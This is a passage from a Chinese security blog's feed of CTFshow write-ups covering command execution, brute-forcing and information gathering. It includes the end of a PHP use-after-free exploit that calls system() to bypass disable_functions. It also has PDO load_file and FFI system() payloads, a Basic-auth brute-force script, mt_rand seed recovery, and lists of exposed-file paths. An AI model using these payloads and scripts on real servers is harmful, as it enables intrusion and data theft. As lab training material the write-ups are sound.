class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p>先试了下UAF，结果页面返回UAF failed</p><p>那先用glob://探探路，发现/flagc.txt</p><p><img src="https://img-blog.csdnimg.cn/e3919cd7b12d412fa62b7675a0cbf225.png" alt="img"></p><p>发现重写strlen的方法，被waf直接拦截。</p><p>再此用一个新方法，利用mysql去访问这个文件并将其打印，数据库名字和密码在前面可以查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagc.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>方法有些勉强</p><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>这题没了open_basedir的限制</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>这题解法有些勉强，毕竟是考点单一，在此记录一下思路。</p><p>依然是利用glob://查看根目录</p><p>然后利用其它应用去访问这个flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagc.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>同上</p><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>这题get新姿势</p><p>题目中说是php7.4</p><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><blockquote><p>FFI扩展已经通过RFC，正式成为PHP 7.4核心扩展。</p><p>什么是FFI</p><p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p><p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag&gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow命令执行&quot;&gt;&lt;a href=&quot;#ctfshow命令执行&quot; class=&quot;headerlink&quot; title=&quot;ctfshow命令执行&quot;&gt;&lt;/a&gt;ctfshow命令执行&lt;/h1&gt;&lt;h2 id=&quot;web29&quot;&gt;&lt;a href=&quot;#web29&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow爆破</title>
    <link href="http://websec.space/2022/01/26/ctfshow%E7%88%86%E7%A0%B4/"/>
    <id>http://websec.space/2022/01/26/ctfshow%E7%88%86%E7%A0%B4/</id>
    <published>2022-01-25T16:00:00.000Z</published>
    <updated>2022-01-26T03:22:19.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow爆破"><a href="#ctfshow爆破" class="headerlink" title="ctfshow爆破"></a>ctfshow爆破</h1><p>开始玩</p><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><blockquote><p>爆破什么的，都是基操</p></blockquote><p>确实是基操，下面演示两种方法。这题是个tomcat的认证。</p><p>法一：bp的intruder</p><p><img src="https://img-blog.csdnimg.cn/fb5a6dc0f46747918903fac9c87a495f.png" alt="img" style="zoom:80%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>确定好爆破位置，选择类型Custom iterator</p><p><img src="https://img-blog.csdnimg.cn/906e644163734867a9a572c55b14303b.png" alt="img"></p><p>导入题目给的附件，进行base64编码，开始攻击！</p><p><img src="https://img-blog.csdnimg.cn/0a99e2128f6449e8918fb083ae0da5b7.png" alt="img"></p><p>找到相应长度最异常的包，发现flag</p><p><img src="https://img-blog.csdnimg.cn/32704e370229479293561c3006cb4adb.png" alt="img"></p><p>法二：</p><p>python脚本，这里贴出官方给的（主要自己懒得去写了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = f.readline() </span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">    password.append(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">rep =requests.get(url,headers=header)</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line"><span class="built_in">print</span>(rep.text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><blockquote><p>域名也可以爆破的，试试爆破这个ctf.show的子域名</p></blockquote><p>直接拿着Layer开扫，结果扫了半天没看见flag相关的信息，看了hint，访问了一下flag.ctf.show挂了，交了flag跑路。</p><p><img src="https://img-blog.csdnimg.cn/3a06bc7471cb4bddbfb3397e36d88733.png" alt="img"></p><h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><blockquote><p>还爆破？这么多代码，告辞！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这次得写个python了，跑一下md5后token的值</p><p>跑长度为二应该就行，写两重for循环，也是只判断一个条件就可，跑出来多个值最后3j可！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">dic = &#x27;0123456789qazwsxedcrfvtgbyhnujmikolp&#x27;</span><br><span class="line">md5 = hashlib.md5(dic.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class="line">for a in dic:</span><br><span class="line">    for b in dic:</span><br><span class="line">        t = str(a)+str(b)</span><br><span class="line">        md5 = hashlib.md5(t.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class="line">        if md5[1:2] == md5[14:15] and md5[14:15]== md5[17:18]:</span><br><span class="line">            print(t)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><blockquote><p>爆个🔨</p></blockquote><p><img src="https://img-blog.csdnimg.cn/fc638926f8ae4c8284cf4025192acc7c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>mt_srand()是根据种子产生随机数的随机函数，再本地部署一下</p><p><img src="https://img-blog.csdnimg.cn/5fa348e580514ac292cb1c52e94f06dc.png" alt="img"></p><p>发现竟然和php版本有关系</p><p><img src="https://img-blog.csdnimg.cn/9369384099314dd8be5e9d3c31be4d7f.png" alt="img"></p><p>传参拿到flag</p><h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><blockquote><p>爆个🔨，不爆了</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>有点复杂</p><p>根据下面这条语句，将r=0查看第一次mt_rand()值的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rand = intval($r)-intval(mt_rand());</span><br></pre></td></tr></table></figure><p>获得值1437571926(每次都不一样），百度mt_rand()发现可以倒推，然后搞脚本</p><p><img src="https://img-blog.csdnimg.cn/45691245894e42f387a87abd0a798289.png" alt="img"></p><p>解出了种子379528259</p><p>成功解出两个的值</p><p>1437571926<br>3521708304</p><p>搞定，新知识get</p><h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><blockquote><p>这个可以爆</p></blockquote><p><img src="https://img-blog.csdnimg.cn/bd7e444d6d1543b483824a76c9cc8ab9.png" alt="img"></p><p>应该是直接爆他数据库开整，bp启动</p><p>爆破出密码7758521</p><h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><blockquote><p>CTFshow菜鸡学院招生啦！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/05db4f87f238445296df23de920245f6.png" alt="img"></p><p>想起来一些不好的事情，点击录取名单</p><p><img src="https://img-blog.csdnimg.cn/706638a78b1842c5a74760f905d4001d.png" alt="img"></p><p>直接去查询系统爆破</p><p><img src="https://img-blog.csdnimg.cn/3577f0e1135849f385ba7b1e867f9aa8.png" alt="img"></p><p>拿下解码</p><p><img src="https://img-blog.csdnimg.cn/ae13ae15863c4ab48e9db0e8ff91f765.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/e35d963859dc45c8b06a225ba6c3877f.png" alt="img"></p><h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><blockquote><p>大海捞针</p></blockquote><p>明显的目录遍历，直接用bp自带的目录遍历功能发现好像不太行</p><p>刚才文件的结构爆破0/0-100试试不行</p><p>然后爆破0-100/0-100</p><p><img src="https://img-blog.csdnimg.cn/b4da789abf004ca096e2be50336e3ecc.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow爆破&quot;&gt;&lt;a href=&quot;#ctfshow爆破&quot; class=&quot;headerlink&quot; title=&quot;ctfshow爆破&quot;&gt;&lt;/a&gt;ctfshow爆破&lt;/h1&gt;&lt;p&gt;开始玩&lt;/p&gt;
&lt;h2 id=&quot;web21&quot;&gt;&lt;a href=&quot;#web21&quot; cl</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>web入门之信息搜集</title>
    <link href="http://websec.space/2022/01/25/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://websec.space/2022/01/25/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2022-01-24T16:00:00.000Z</published>
    <updated>2022-01-25T03:43:40.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web入门之信息搜集"><a href="#web入门之信息搜集" class="headerlink" title="web入门之信息搜集"></a>web入门之信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote><p>开发注释未及时删除 </p></blockquote><p>ctr+u或者f12</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><blockquote><p>js前台拦截 <em>=== 无效操作</em></p></blockquote><p>前端过滤了f12</p><p>ctr+u搞定</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><blockquote><p>没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>bp抓包</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><blockquote><p>总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>访问robots.txt</p><p>发现文件flagishere.txt访问得到flag</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><blockquote><p>phps源码泄露有时候能帮上忙</p></blockquote><p>访问index.phps发现源码泄露打开存在。</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><blockquote><p>解压源码到当前目录，测试正常，收工</p></blockquote><p>源码泄露，首先访问<a href="http://www.zip/">www.zip</a></p><p>成功拉取到源码，但是不正确fl000g.txt</p><p>于是直接再浏览器访问fl000g.txt拿到源码</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>版本控制器首先想到了git泄露</p><p>输入/.git拿到flag</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>版本控制器除了/.git就是/.svn</p><p>果然flag到手</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote><p>发现网页有个错别字？赶紧在生产环境<strong>vim</strong>改下，不好，死机了</p></blockquote><p>vim中途如果出现问题会当前文件夹下生成</p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><blockquote><p>cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>浏览器查看cookie发现flag</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><blockquote><p>域名其实也可以隐藏信息，比如<strong>ctfshow</strong>.com 就隐藏了一条信息</p></blockquote><p>通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>根据提示先访问/admin发现有登录页面</p><p><img src="https://img-blog.csdnimg.cn/8d88de8c6e8a40389b5df4a25786fb9c.png" alt="img" style="zoom: 80%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>密码未知根据题目信息去页面观察</p><img src="https://img-blog.csdnimg.cn/0ac70b8b570142f2959878e5edd69b9f.png" alt="img" style="zoom: 80%;" /><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><blockquote><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>根据题目条件去找官方文档</p><p>发现document有入口以及密码拿到flag</p><img src="https://img-blog.csdnimg.cn/f3d21a26e4a649ae9fa8b2177f632d1d.png" alt="img" style="zoom:50%;" /><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote><p>有时候源码里面就能不经意间泄露重要*(editor)*的信息,默认配置害死人</p></blockquote><p><img src="https://img-blog.csdnimg.cn/4d5b7df3146348a88d36ef0ea23f84b2.png" alt="img"></p><p>editor信息中，然后发现上传文件的地方可以直接</p><img src="https://img-blog.csdnimg.cn/27b013d770694798bc115b9176000986.png" alt="img" style="zoom: 80%;" /><p>那这可太离谱了。</p><img src="https://img-blog.csdnimg.cn/f022f0a426ba450fbbcbfad53331ba7a.png" alt="img" style="zoom: 80%;" /><p>访问/nothinghere/fl000g.txt拿下</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><img src="C:\Users\97085\AppData\Roaming\Typora\typora-user-images\image-20220124191527791.png" alt="image-20220124191527791" style="zoom: 80%;" /><p>访问/admin点击忘记密码根据题目条件，发现是一个qq邮箱</p><p><img src="https://img-blog.csdnimg.cn/983366f282f240d58703eadce7152deb.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>搞定！</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>发现知识盲点了，先学习一下</p><p>PHP探针：php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p><p>试着访问了下/tz.php</p><p><img src="https://img-blog.csdnimg.cn/5734280a4eab497488f34566ae79672f.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>看了看，不知道flag在哪就习惯性访问了下phpinfo果然</p><img src="https://img-blog.csdnimg.cn/395d312fa8714ed68ab8c02dc391751c.png" alt="img" style="zoom:50%;" /><p>**顺便吐槽，藏得好深 **</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote><p>备份的<strong>sql</strong>文件会泄露敏感信息</p></blockquote><p>没做过类似的直接坐牢了，想了半天还是看了提示</p><p>访问backup.sql</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote><p>不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>做过类似的就是查看js源代码，发现一串unicode编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</span><br></pre></td></tr></table></figure><p>你赢了，去幺幺零点皮爱吃皮看看</p><p>访问110.php</p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><blockquote><p>密钥什么的，就不要放在前端了</p></blockquote><p>放在前端我原称之为傻子程序员</p><img src="https://img-blog.csdnimg.cn/7b8b5ba769f142f4a526a9b00df1fa7f.png" alt="img" style="zoom: 80%;" /><p>直接看前端的代码，发现账户密码。</p><p>但密码是加密过的不能通过前端传输，得用bp，或者用hackbar</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><blockquote><p>mdb文件是早期asp+<strong>access</strong>构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>网上百度，然后直接访问/db/db.mp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web入门之信息搜集&quot;&gt;&lt;a href=&quot;#web入门之信息搜集&quot; class=&quot;headerlink&quot; title=&quot;web入门之信息搜集&quot;&gt;&lt;/a&gt;web入门之信息搜集&lt;/h1&gt;&lt;h2 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;head</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
</feed>
